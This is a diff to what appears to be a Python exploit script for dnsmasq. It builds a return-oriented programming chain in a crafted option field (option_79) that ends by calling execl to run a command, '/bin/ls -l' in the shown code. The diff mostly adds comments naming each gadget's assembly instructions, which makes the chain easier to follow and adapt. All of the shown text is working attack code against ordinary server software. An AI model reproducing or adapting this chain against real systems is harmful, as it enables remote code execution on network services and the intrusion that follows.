@@ -588,29 +588,36 @@ def exploit():
         # option_79 += Base.pack64(CRASH[architecture])  # crash for debug
 
         # R8D = 0x7750022
+        # mov r8d, 0x7750022 ; ret
         option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["set r8d"])
 
         # RSI + 0x70 = ADDR(path) = 0xFFFFFFFEF88AFFDE
+        # pop rsi; ret
         option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rsi"])
         option_79 += Base.pack64(path - 0x70)
+        # pop rdi; ret
         option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rdi"])
         option_79 += Base.pack64(0xFFFFFFFEF88AFFDE)
+        # mov qword ptr [rsi + 0x70], rdi ; ret
         option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["mov"])
 
-        # RDI = ADDR(path) = 0xFFFFFFFEF88AFFDE
+        # ECX = ADDR(path) = 0xFFFFFFFEF88AFFDE
+        # pop rdi; ret
         option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rdi"])
         option_79 += Base.pack64(path)
-
-        # ECX = ADDR(path) = 0xFFFFFFFEF88AFFDE
+        # pop rdx; ret
         option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rdx"])
         option_79 += Base.pack64(path + 8)
+        # mov ecx, edi ; shl eax, cl ; or dword ptr [rdx], eax ; ret
         option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["mov ecx"])
 
         # EBP = ADDR(path) = 0xFFFFFFFEF88AFFDE
+        # pop rbp ; ret
         option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rbp"])
         option_79 += Base.pack64(path)
 
         # R8D = 0x0000000000000000
+        # add r8d, [rcx]; mov [rbp], rax; add rsp, 8; mov rax, rbx; pop rbx; pop rbp; ret
         option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["add r8d"])
         option_79 += Base.pack64(NOP[architecture])  # RBX = 0x9090909090909090
         option_79 += Base.pack64(NOP[architecture])  # RBP = 0x9090909090909090
@@ -622,29 +629,38 @@ def exploit():
         option_79 += add_string_in_data(path, "/tmp/")
 
         # ECX = "/tmp/"
+        # pop rdi; ret
         option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rdi"])
         option_79 += Base.pack64(path)
+        # pop rdx; ret
         option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rdx"])
         option_79 += Base.pack64(path + 8)
+        # mov ecx, edi ; shl eax, cl ; or dword ptr [rdx], eax ; ret
         option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["mov ecx"])
 
         # ESI = "/bin/ls"
+        # pop rsi; ret
         option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rsi"])
         option_79 += Base.pack64(path_to_command)
 
         # EDI = "/bin/ls"
+        # pop rdi; ret
         option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rdi"])
         option_79 += Base.pack64(path_to_command)
 
         # RAX = 0x0000000000000000
+        # pop rax; ret
         option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rax"])
         option_79 += Base.pack64(0x0000000000000000)
 
         # EDX = "-l"
+        # pop rdx; ret
         option_79 += Base.pack64(ROP[architecture][dnsmasq_version]["pop rdx"])
         option_79 += Base.pack64(arg)
 
         # option_79 += Base.pack64(CRASH[architecture])  # crash for debug
+
+        # EXECL
         option_79 += Base.pack64(EXECL[architecture][dnsmasq_version])  # address of execl
 
     else:
